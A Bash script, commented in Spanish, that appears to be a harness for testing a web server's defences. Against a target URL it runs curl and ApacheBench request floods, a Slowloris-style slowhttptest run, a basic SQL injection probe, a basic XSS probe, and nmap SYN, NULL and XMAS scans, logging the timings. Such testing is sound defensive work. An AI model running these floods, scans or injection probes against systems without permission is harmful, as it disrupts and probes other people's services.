#!/bin/bash

TARGET=${1:-http://localhost}
TIPO_ATAQUE=$2
LOGFILE="resultados_ataques.txt"

[[ "$TARGET" =~ ^http ]] || TARGET="http://$TARGET"

function log() {
  echo -e "\n\n[>> $1 <<]" | tee -a "$LOGFILE"
}

function medir_tiempo() {
  local start=$(date +%s%3N)
  local cmd="$*"
  local output
  output=$(eval "$cmd" 2>&1)
  local status=$?
  local end=$(date +%s%3N)
  local duration=$((end - start))
  echo "$output" | tee -a "$LOGFILE"
  echo "[⏱] Tiempo de ejecución: ${duration} ms" | tee -a "$LOGFILE"
  return $status
}

function ataque_ddos() {
  log "Ataque DoS curl paralelo (100)"
  local completed=0 failed=0
  local start=$(date +%s%3N)

  for i in {1..100}; do
    if curl -s -o /dev/null --max-time 5 "$TARGET"; then
      ((completed++))
    else
      ((failed++))
    fi
  done

  local end=$(date +%s%3N)
  local duration=$((end - start))
  local total=$((completed + failed))
  local success_pct=$(( total > 0 ? 100 * completed / total : 0 ))

  echo "[⏱] Tiempo de ejecución: ${duration} ms" | tee -a "$LOGFILE"
  echo "[✔] Completadas: $completed | [✖] Fallidas: $failed | [📊] Éxito: $success_pct%" | tee -a "$LOGFILE"
}

function ataque_ddos_saturacion() {
  log "Apache Bench: 1000 peticiones / 100 concurrencia"
  medir_tiempo ab -n 1000 -c 100 "$TARGET/"
}

function ataque_ddos_slow() {
  log "Simulación Slowloris"
  if ! command -v slowhttptest &>/dev/null; then
    echo "[!] slowhttptest no está instalado." | tee -a "$LOGFILE"
    return
  fi
  medir_tiempo slowhttptest -c 200 -H -i 10 -r 200 -t GET -u "$TARGET/" -x 24 -p 3 -l 10
}

function ataque_sqli() {
  log "Ataque SQL Injection"
  local code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/?id=1 UNION SELECT * FROM users WHERE '1'='1'")
  echo "[HTTP_CODE:$code]" | tee -a "$LOGFILE"
}

function ataque_xss() {
  log "Ataque XSS"
  local code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/?search=<script>alert('x')</script>")
  echo "[HTTP_CODE:$code]" | tee -a "$LOGFILE"
}

function escaneo_puertos() {
  log "Escaneo SYN"
  medir_tiempo sudo nmap -sS -Pn -T4 -p- "$(echo "$TARGET" | sed 's|http[s]*://||')"
}

function escaneo_null() {
  log "Escaneo NULL"
  medir_tiempo sudo nmap -sN -Pn "$(echo "$TARGET" | sed 's|http[s]*://||')"
}

function escaneo_xmas() {
  log "Escaneo XMAS"
  medir_tiempo sudo nmap -sX -Pn "$(echo "$TARGET" | sed 's|http[s]*://||')"
}

function prueba_http() {
  log "Acceso normal"
  local start=$(date +%s%3N)
  if curl -s -o /dev/null "$TARGET"; then
    echo "[✓] Acceso exitoso a $TARGET" | tee -a "$LOGFILE"
  else
    echo "[✖] No se pudo acceder a $TARGET" | tee -a "$LOGFILE"
  fi
  local end=$(date +%s%3N)
  echo "[⏱] Tiempo de ejecución: $((end - start)) ms" | tee -a "$LOGFILE"
}

function ejecutar_todo() {
  rm -f "$LOGFILE"
  prueba_http
  ataque_ddos
  ataque_ddos_saturacion
  ataque_ddos_slow
  ataque_sqli
  ataque_xss
  escaneo_puertos
  escaneo_null
  escaneo_xmas
}

function ayuda() {
  echo "Uso: $0 <url> <ataque>"
  echo "Tipos de prueba:"
  echo "  --test         => Acceso normal"
  echo "  --ddos         => Conexiones curl simultáneas"
  echo "  --ddos-full    => ApacheBench con 1000 peticiones"
  echo "  --ddos-slow    => Simula conexión lenta tipo Slowloris"
  echo "  --sqli         => Simulación de SQL Injection"
  echo "  --xss          => Simulación de Cross Site Scripting"
  echo "  --scan         => Escaneo SYN con nmap"
  echo "  --scan-null    => Escaneo NULL con nmap"
  echo "  --scan-xmas    => Escaneo XMAS con nmap"
  echo "  --all          => Ejecuta todas las pruebas anteriores"
}

case "$TIPO_ATAQUE" in
  --test) prueba_http ;;
  --ddos) ataque_ddos ;;
  --ddos-full) ataque_ddos_saturacion ;;
  --ddos-slow) ataque_ddos_slow ;;
  --sqli) ataque_sqli ;;
  --xss) ataque_xss ;;
  --scan) escaneo_puertos ;;
  --scan-null) escaneo_null ;;
  --scan-xmas) escaneo_xmas ;;
  --all) ejecutar_todo ;;
  *) ayuda ;;
esac
